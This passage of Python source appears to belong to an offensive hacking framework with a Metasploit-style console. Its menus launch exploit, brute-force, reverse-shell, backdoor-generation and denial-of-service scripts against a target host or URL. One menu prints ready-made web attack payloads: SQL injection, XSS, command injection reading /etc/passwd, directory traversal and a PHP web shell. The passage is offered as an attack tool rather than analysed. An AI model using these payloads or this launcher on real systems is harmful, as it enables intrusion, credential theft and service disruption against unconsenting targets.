    elif scconsole == "use scanner/ftp-anon":
        time.sleep(0.5)
        print("using scanner/ftp-anon.")
        scannerftpanon()
    elif scconsole == "use scanner/portmap-amp":
        time.sleep(0.5)
        print("using scanner/portmap-amp.")
        scannerportmapamp()
    elif scconsole == "use scanner/subdomain-scan":
        time.sleep(0.5)
        print("using scanner/subdomain-scan.")
        scannersubdomainscan()
    elif scconsole == "use scanner/portscan":
        time.sleep(0.5)
        print("using scanner/portscan.")
        scannerportscan()
    elif scconsole == "use auxiliary/sqli-xss-vuln":
        time.sleep(0.5)
        print("using auxiliary/sqli-xss-vuln.")
        aauxiliarysqlixssvuln()
    elif scconsole == "use scanner/ping_ip_site":
        time.sleep(0.5)
        print("using scanner/ping_ip_site.")
        scannerpingipsite()
    elif scconsole == "use auxiliary/check-login-vuln":
        time.sleep(0.5)
        print("using auxiliary/check-login-vuln.")
        auxiliarycheckloginvuln()
    elif scconsole == "use server/php-cgi-arg-injection":
        time.sleep(0.5)
        print("using server/php-cgi-arg-injection.")
        serverphpcgiarginjection()
    elif scconsole == "use auxiliary/password_cracking/crack_password":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack_password.")
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole == "use multi/cve-2025-0282":
        time.sleep(0.5)
        print("using multi/cve-2025-0282.")
        multicve20250282()
    elif scconsole == "use multi/generate_backdoor":
        time.sleep(0.5)
        print("using multi/generate_backdoor.")
        multigeneratebackdoor()
    elif scconsole == "use multi/nc-listener":
        time.sleep(0.5)
        print("using multi/nc-listener.")
        multinclistener()
    elif scconsole == "use windows/ms08_067_netapi":
        time.sleep(0.5)
        print("using windows/ms08_067_netapi.")
        windowsms08067netapi()
    elif scconsole == "use php/WordPress_Core_6-2_Directory_Traversal":
        time.sleep(0.5)
        print("using php/WordPress_Core_6-2_Directory_Traversal.")
        phpWordPressCore62DirectoryTraversal()
    elif scconsole == "use dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS":
        time.sleep(0.5)
        print("using dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.")
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole == "use site/Apache_commons_text_RCE":
        time.sleep(0.5)
        print("using site/Apache_commons_text_RCE.")
        siteApachecommonstextRCE()
    elif scconsole == "use scanner/http-options":
        time.sleep(0.5)
        print("using scanner/http-options.")
        scannerhttpoptions()
    elif scconsole == "use scanner/https-options":
        time.sleep(0.5)
        print("using scanner/https-options.")
        scannerhttpsoptions()
    elif scconsole == "use scanner/server-scanner":
        time.sleep(0.5)
        print("using scanner/server-scanner.")
        scannerserverscanner()
    elif scconsole == "use system commands":
            OSconsole()
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "use system command":
            OSconsole()
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "exit":
        exit()
    else:
        time.sleep(0.5)
        print("there is no command or option to use like that!")

def exploitms17010psexec():
    scconsole6 = input("sc~" + color.red + "(exploit/ms17-010-psexec)" + color.white + ">")
    if scconsole6 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitms17010psexec()
    elif scconsole6 == "clear":
        os.system('clear')
        exploittomcatmgrlogin()
    elif scconsole6 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.
CMD              | specify the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitms17010psexec()
    elif scconsole6 == "run":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "exploit":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "unuse":
        print("unusing exploit/ms17-010-psexec.")
        time.sleep(0.5)
        Console()
    elif scconsole6 == "exit":
        exit()

def exploitbypassuaceventvwr():
    scconsole7 = input("sc~" + color.red + "(exploit/bypassuac-eventvwr)" + color.white + ">")
    if scconsole7 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "clear":
        os.system('clear')
        exploitbypassuaceventvwr()
    elif scconsole7 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
CMD              | specify the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "run":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "exploit":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "unuse":
        print("unusing exploit/bypassuac-eventvwr.")
        time.sleep(0.5)
        Console()
    elif scconsole7 == "exit":
        exit()

def exploitfindvulnerabilitesscan():
    scconsole8 = input("sc~" + color.red + "(exploit/find-vulnerabilites-scan)" + color.white + ">")
    if scconsole8 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "clear":
        os.system('clear')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "run":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "exploit":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "unuse":
        print("unusing exploit/find-vulnerabilites-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole8 == "exit":
        exit()

def exploitsshversion():
    scconsole12 = input("sc~" + color.red + "(exploit/ssh-version)" + color.white + ">")
    if scconsole12 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitsshversion()
    elif scconsole12 == "clear":
        os.system('clear')
        exploitsshversion()
    elif scconsole12 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).

you will specifiy these options when you run or exploit it!
""")
        exploitsshversion()
    elif scconsole12 == "run":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "exploit":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "unuse":
        print("unusing exploit/ssh-version.")
        time.sleep(0.5)
        Console()
    elif scconsole12 == "exit":
        exit()

def exploitreverseshell():
    scconsole16 = input("sc~" + color.red + "(exploit/reverse-shell)" + color.white + ">")
    if scconsole16 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitreverseshell()
    elif scconsole16 == "clear":
        os.system('clear')
        exploitreverseshell()
    elif scconsole16 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
LPORT            | specify your port.

you will specifiy these options when you run or exploit it!
""")
        exploitreverseshell()
    elif scconsole16 == "run":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "exploit":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "unuse":
        print("unusing exploit/reverse-shell.")
        time.sleep(0.5)
        Console()
    elif scconsole16 == "exit":
        exit()

def exploithandlerhandler():
    scconsole17 = input("sc~" + color.red + "(exploit/handler/handler)" + color.white + ">")
    if scconsole17 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithandlerhandler()
    elif scconsole17 == "clear":
        os.system('clear')
        exploithandlerhandler()
    elif scconsole17 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploithandlerhandler()
    elif scconsole17 == "run":
        os.system('python exploits/handler/handler.py')
        exploithandlerhandler()
    elif scconsole17 == "exploit":
        os.system('python exploits/handler/handler.py')
        exploithandlerhandler()
    elif scconsole17 == "unuse":
        print("unusing exploit/handler/handler.")
        time.sleep(0.5)
        Console()
    elif scconsole17 == "exit":
        exit()

def exploithandlerlistining():
    scconsole18 = input("sc~" + color.red + "(exploit/handler/listining)" + color.white + ">")
    if scconsole18 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithandlerlistining()
    elif scconsole18 == "clear":
        os.system('clear')
        exploithandlerlistining()
    elif scconsole18 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploithandlerlistining()
    elif scconsole18 == "run":
        os.system('python exploits/handler/listining.py')
        exploithandlerlistining()
    elif scconsole18 == "exploit":
        os.system('python exploits/handler/listining.py')
        exploithandlerlistining()
    elif scconsole18 == "unuse":
        print("unusing exploit/handler/listining.")
        time.sleep(0.5)
        Console()
    elif scconsole18 == "exit":
        exit()

def wexploitsshlogintest():
    scconsole19 = input("sc~" + color.red + "(windows/ssh-login-test)" + color.white + ">")
    if scconsole19 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitsshlogintest()
    elif scconsole19 == "clear":
        os.system('clear')
        wexploitsshlogintest()
    elif scconsole19 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        wexploitsshlogintest()
    elif scconsole19 == "run":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "exploit":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "unuse":
        print("unusing windows/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole19 == "exit":
        exit()

def wexploitjavarhino():
    scconsole20 = input("sc~" + color.red + "(windows/java-rhino)" + color.white + ">")
    if scconsole20 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitjavarhino()
    elif scconsole20 == "clear":
        os.system('clear')
        wexploitjavarhino()
    elif scconsole20 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
RPORT         | specify the target port (port 445 needs to open on target).
CMD           | specify the cmd command.

you will specifiy these options when you run or exploit it!
""")
        wexploitjavarhino()
    elif scconsole20 == "run":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "exploit":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "unuse":
        print("unusing windows/java-rhino.")
        time.sleep(0.5)
        Console()
    elif scconsole20 == "exit":
        exit()

def wexploitms17010psexec():
    scconsole21 = input("sc~" + color.red + "(windows/ms17_010)" + color.white + ">")
    if scconsole21 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitms17010psexec()
    elif scconsole21 == "clear":
        os.system('clear')
        wexploitms17010psexec()
    elif scconsole21 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        wexploitms17010psexec()
    elif scconsole21 == "run":
        os.system('python exploits/windows/ms17_010.py')
        wexploitms17010psexec()
    elif scconsole21 == "exploit":
        os.system('python exploits/windows/ms17_010.py')
        wexploitms17010psexec()
    elif scconsole21 == "unuse":
        print("unusing windows/ms17_010.")
        time.sleep(0.5)
        Console()
    elif scconsole21 == "exit":
        exit()

def wexploitPDFexploit():
    scconsole22 = input("sc~" + color.red + "(windows/PDF-exploit)" + color.white + ">")
    if scconsole22 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitPDFexploit()
    elif scconsole22 == "clear":
        os.system('clear')
        wexploitPDFexploit()
    elif scconsole22 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        wexploitPDFexploit()
    elif scconsole22 == "run":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "exploit":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "unuse":
        print("unusing windows/PDF-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole22 == "exit":
        exit()

def wexploitftplogintest():
    scconsole23 = input("sc~" + color.red + "(windows/ftp-login-test)" + color.white + ">")
    if scconsole23 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitftplogintest()
    elif scconsole23 == "clear":
        os.system('clear')
        wexploitftplogintest()
    elif scconsole23 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        wexploitftplogintest()
    elif scconsole23 == "run":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "exploit":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "unuse":
        print("unusing windows/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole23 == "exit":
        exit()

def texploitXSS():
    scconsole24 = input("sc~" + color.red + "(site/XSS-SQLi-PHP-PASS)" + color.white + ">")
    if scconsole24 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitXSS()
    elif scconsole24 == "clear":
        os.system('clear')
        texploitXSS()
    elif scconsole24 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url login-page.
USERNAME         | specify the username.

you will specifiy these options when you run or exploit it!
""")
        texploitXSS()
    elif scconsole24 == "run":
        os.system('python exploits/site/XSS-SQLi-PHP-PASS.py')
        texploitXSS()
    elif scconsole24 == "exploit":
        os.system('python exploits/site/XSS-SQLi-PHP-PASS.py')
        texploitXSS()
    elif scconsole24 == "unuse":
        print("unusing site/XSS-SQLi-PHP-PASS.")
        time.sleep(0.5)
        Console()
    elif scconsole24 == "exit":
        exit()

def texploitfindvulnerabiliteswebsite():
    scconsole25 = input("sc~" + color.red + "(site/vuln-curl-website)" + color.white + ">")
    if scconsole25 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "run":
        os.system('python exploits/site/vuln-curl-website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "exploit":
        os.system('python exploits/site/vuln-curl-website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "unuse":
        print("unusing site/vuln-curl-website.")
        time.sleep(0.5)
        Console()
    elif scconsole25 == "exit":
        exit()

def texploitfindvulnerabiliteswebsite2():
    scconsole26 = input("sc~" + color.red + "(site/find-vulnerabilites-website2)" + color.white + ">")
    if scconsole26 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
PAYLOAD          | specify the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "run":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "exploit":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "unuse":
        print("unusing site/find-vulnerabilites-website2.")
        time.sleep(0.5)
        Console()
    elif scconsole26 == "exit":
        exit()

def texploithttplogintest():
    scconsole27 = input("sc~" + color.red + "(site/http-login-test)" + color.white + ">")
    if scconsole27 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploithttplogintest()
    elif scconsole27 == "clear":
        os.system('clear')
        texploithttplogintest()
    elif scconsole27 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        texploithttplogintest()
    elif scconsole27 == "run":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "exploit":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "unuse":
        print("unusing site/http-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole27 == "exit":
        exit()

def texploitZIPexploit():
    scconsole28 = input("sc~" + color.red + "(site/ZIP-exploit)" + color.white + ">")
    if scconsole28 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitZIPexploit()
    elif scconsole28 == "clear":
        os.system('clear')
        texploitZIPexploit()
    elif scconsole28 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url to upload zip file.

you will specifiy these options when you run or exploit it!
""")
        texploitZIPexploit()
    elif scconsole28 == "run":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "exploit":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "unuse":
        print("unusing site/ZIP-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole28 == "exit":
        exit()

def texploittomcatmgrlogin():
    scconsole29 = input("sc~" + color.red + "(site/tomcat-mgr-login)" + color.white + ">")
    if scconsole29 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "clear":
        os.system('clear')
        texploittomcatmgrlogin()
    elif scconsole29 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.
BRUTEFORCE-SPEED | specify the brute force speed.

you will specifiy these options when you run or exploit it!
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "run":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "exploit":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "unuse":
        print("unusing site/tomcat-mgr-login.")
        time.sleep(0.5)
        Console()
    elif scconsole29 == "exit":
        exit()

def exploitcve202322518cve202322518():
    scconsole30 = input("sc~" + color.red + "(exploit/cve-2023-22518/cve-2023-22518)" + color.white + ">")
    if scconsole30 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitcve202322518cve202322518()
    elif scconsole30 == "clear":
        os.system('clear')
        exploitcve202322518cve202322518()
    elif scconsole30 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
ZIP              | specify the zip from /sc_framework/exploits/cve-2023-22518/xmlexport-20231109-060519-1.zip .

you will specifiy these options when you run or exploit it!
""")
        exploitcve202322518cve202322518()
    elif scconsole30 == "run":
        os.system('python exploits/cve-2023-22518/cve-2023-22518.py')
        exploitcve202322518cve202322518()
    elif scconsole30 == "exploit":
        os.system('python exploits/cve-2023-22518/cve-2023-22518.py')
        exploitcve202322518cve202322518()
    elif scconsole30 == "unuse":
        print("unusing exploit/cve-2023-22518/cve-2023-22518.")
        time.sleep(0.5)
        Console()
    elif scconsole30 == "exit":
        exit()

def exploitvulncve202322518cve202322518():
    scconsole31 = input("sc~" + color.red + "(exploit/cve-2023-22518/vuln-test-for-cve-2023-22518)" + color.white + ">")
    if scconsole31 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "clear":
        os.system('clear')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
URLLIST          | specify the path of url list.

you will specifiy these options when you run or exploit it!
""")
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "run":
        url = input("URL: ")
        urllist = input("URLLIST: ")
        os.system(f'python exploits/cve-2023-22518/vuln-test-for-cve-2023-22518.py --url {url} --file {urllist}')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "exploit":
        url2 = input("URL: ")
        urllist2 = input("URLLIST: ")
        os.system(f'python exploits/cve-2023-22518/vuln-test-for-cve-2023-22518.py --url {url2} --file {urllist2}')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "unuse":
        print("unusing exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
        time.sleep(0.5)
        Console()
    elif scconsole31 == "exit":
        exit()

def texploitDDDAttack():
    scconsole33 = input("sc~" + color.red + "(dos/DD_D_Attack)" + color.white + ">")
    if scconsole33 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitDDDAttack()
    elif scconsole33 == "clear":
        os.system('clear')
        texploitDDDAttack()
    elif scconsole33 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
TIME             | specify the time.

you will specifiy these options when you run or exploit it!
""")
        texploitDDDAttack()
    elif scconsole33 == "run":
        os.system('ruby exploits/dos/DD_D_Attack.rb')
        texploitDDDAttack()
    elif scconsole33 == "exploit":
        os.system('ruby exploits/dos/DD_D_Attack.rb')
        texploitDDDAttack()
    elif scconsole33 == "unuse":
        print("unusing dos/DD_D_Attack.")
        time.sleep(0.5)
        Console()
    elif scconsole33 == "exit":
        exit()

def w7zipcve20250411():
    scconsole34 = input("sc~" + color.red + "(windows/7-zip_cve-2025-0411)" + color.white + ">")
    if scconsole34 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        w7zipcve20250411()
    elif scconsole34 == "clear":
        os.system('clear')
        w7zipcve20250411()
    elif scconsole34 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
ATTACKER-PORT    | specify your port.
LISTEN-PORT      | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        w7zipcve20250411()
    elif scconsole34 == "run":
        os.system('./exploits/windows/7-zip_cve-2025-0411')
        w7zipcve20250411()
    elif scconsole34 == "exploit":
        os.system('./exploits/windows/7-zip_cve-2025-0411')
        w7zipcve20250411()
    elif scconsole34 == "unuse":
        print("unusing windows/7-zip_cve-2025-0411.")
        time.sleep(0.5)
        Console()
    elif scconsole34 == "exit":
        exit()

def tdirectoryfinder():
    scconsole35 = input("sc~" + color.red + "(site/Directory-finder)" + color.white + ">")
    if scconsole35 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tdirectoryfinder()
    elif scconsole35 == "clear":
        os.system('clear')
        tdirectoryfinder()
    elif scconsole35 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url login-page.
URLLIST          | specify the url-list path.

you will specifiy these options when you run or exploit it!
""")
        tdirectoryfinder()
    elif scconsole35 == "run":
        os.system('python exploits/site/Directory-finder.py')
        tdirectoryfinder()
    elif scconsole35 == "exploit":
        os.system('python exploits/site/Directory-finder.py')
        tdirectoryfinder()
    elif scconsole35 == "unuse":
        print("unusing site/Directory-finder.")
        time.sleep(0.5)
        Console()
    elif scconsole35 == "exit":
        exit()

def tstruts2namespaceognl():
    scconsole36 = input("sc~" + color.red + "(site/struts2_namespace_ognl)" + color.white + ">")
    if scconsole36 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tstruts2namespaceognl()
    elif scconsole36 == "clear":
        os.system('clear')
        tstruts2namespaceognl()
    elif scconsole36 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url login-page.
URLLIST          | specify the url-list path.

you will specifiy these options when you run or exploit it!
""")
        tstruts2namespaceognl()
    elif scconsole36 == "run":
        os.system('python exploits/site/struts2_namespace_ognl.py')
        tstruts2namespaceognl()
    elif scconsole36 == "exploit":
        os.system('python exploits/site/struts2_namespace_ognl.py')
        tstruts2namespaceognl()
    elif scconsole36 == "unuse":
        print("unusing site/struts2_namespace_ognl.")
        time.sleep(0.5)
        Console()
    elif scconsole36 == "exit":
        exit()

def mexploitsshlogintest():
    scconsole37 = input("sc~" + color.red + "(multi/ssh-login-test)" + color.white + ">")
    if scconsole37 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitsshlogintest()
    elif scconsole37 == "clear":
        os.system('clear')
        mexploitsshlogintest()
    elif scconsole37 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
